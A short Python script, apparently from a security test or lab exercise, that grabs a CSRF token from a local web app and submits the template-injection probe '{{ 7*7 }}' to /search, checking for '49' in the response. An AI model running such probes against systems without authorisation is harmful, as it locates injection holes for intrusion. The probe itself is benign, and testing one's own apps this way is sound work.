import urllib.request, urllib.parse, re, sys, json

base_url = "http://127.0.0.1:33077"
headers = {'Host': 'localhost', 'User-Agent': 'Mozilla/5.0'}

print("Testing SSTI on /search")

try:
    req = urllib.request.Request(base_url, headers=headers)
    with urllib.request.urlopen(req, timeout=5) as resp:
        html = resp.read().decode('utf-8')
        print(f"GET / - Status: {resp.status}, Length: {len(html)}B")
        
        csrf_match = re.search(r'csrfmiddlewaretoken.*?value="([^"]+)"', html)
        csrf_token = csrf_match.group(1) if csrf_match else None
        print(f"CSRF: {csrf_token[:10] if csrf_token else 'Not found'}")
        
        # Test SSTI payload
        data = {'search': '{{ 7*7 }}'}
        if csrf_token:
            data['csrfmiddlewaretoken'] = csrf_token
            
        post_data = urllib.parse.urlencode(data).encode('ascii')
        req = urllib.request.Request(
            f"{base_url}/search",
            data=post_data,
            headers={'Host': 'localhost', 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        with urllib.request.urlopen(req, timeout=5) as resp:
            html = resp.read().decode('utf-8')
            print(f"POST /search - Status: {resp.status}, Length: {len(html)}B")
            print(f"Contains '49': {'49' in html}")
            has_payload = '{{ 7*7 }}' in html
            executed = '49' in html and not has_payload
            print(f"Executed: {executed}")
            print(f"Response preview: {html[:200]}")
            
except Exception as e:
    print(f"Error: {str(e)}")
    sys.exit(1)
